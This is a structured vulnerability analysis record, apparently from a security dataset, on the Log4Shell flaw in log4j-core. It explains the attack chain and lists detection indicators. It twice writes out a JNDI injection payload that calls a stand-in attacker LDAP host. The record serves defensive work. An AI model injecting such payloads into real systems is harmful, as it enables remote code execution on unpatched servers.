package_info.why_malicious: The affected versions of log4j-core contain a critical remote code execution vulnerability (Log4Shell, CVE-2021-44228 and CVE-2021-45046) that allows attackers to execute arbitrary code on the server by injecting crafted log messages. While not intentionally malicious, this vulnerability enables attackers to gain full control of affected systems through log message content, representing a severe exploitation risk.

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) is processed, the code performs a JNDI lookup using attacker-controlled input, resulting in the loading and execution of remote code from an external server.

malice_analysis.why_suspicious: This code allows untrusted user input in log messages to trigger JNDI lookups, which can result in loading and executing code from attacker-controlled servers. This creates a direct path for remote code execution without authentication or authorization.
malice_analysis.violated_expectations: Logging frameworks are expected to record messages, not execute code or perform network lookups based on log content. Here, user-controlled log data can trigger network requests and code execution, violating the principle of safe logging.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate for internal service discovery in trusted environments, but should never be triggered by untrusted or user-supplied log data.
key_indicators: JNDI lookups initiated from log message content
Dynamic class loading or deserialization from remote sources during log processing
Network connections to external LDAP/RMI/HTTP servers triggered by log events

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to the vulnerable application.
attack_chain.leads_to: The log message is processed by log4j-core, triggering the JNDI lookup.

attack_chain.action: The vulnerable log4j-core code performs a JNDI lookup to the attacker-controlled server.
attack_chain.leads_to: Remote code or serialized object is loaded and executed, resulting in remote code execution on the server.

behavioral_signatures: JNDI lookups triggered by log message content (e.g., ${jndi:ldap://...})
Network requests to external LDAP/RMI/HTTP servers during log processing
Dynamic class loading or deserialization from remote sources initiated by log events
file_indicators: JAR/WAR files containing log4j-core versions 2.0-beta9 through 2.14.1
network_indicators: Outbound LDAP, RMI, or HTTP requests to untrusted or external domains during log processing
Unexpected connections to attacker-controlled infrastructure (e.g., domains or IPs not present in normal application operation) initiated by the Java process
detection_knowledge.how_to_detect: Scan Java application artifacts (JARs/WARs) for the presence of vulnerable log4j-core versions (2.0-beta9 through 2.14.1) and the JndiLookup class. Monitor runtime logs and network activity for JNDI lookup patterns in log messages and unexpected outbound LDAP/RMI/HTTP requests. Use static and dynamic analysis tools to identify code paths where user-controlled input is logged and could trigger JNDI lookups. Correlate network activity with log processing events to detect exploitation attempts.
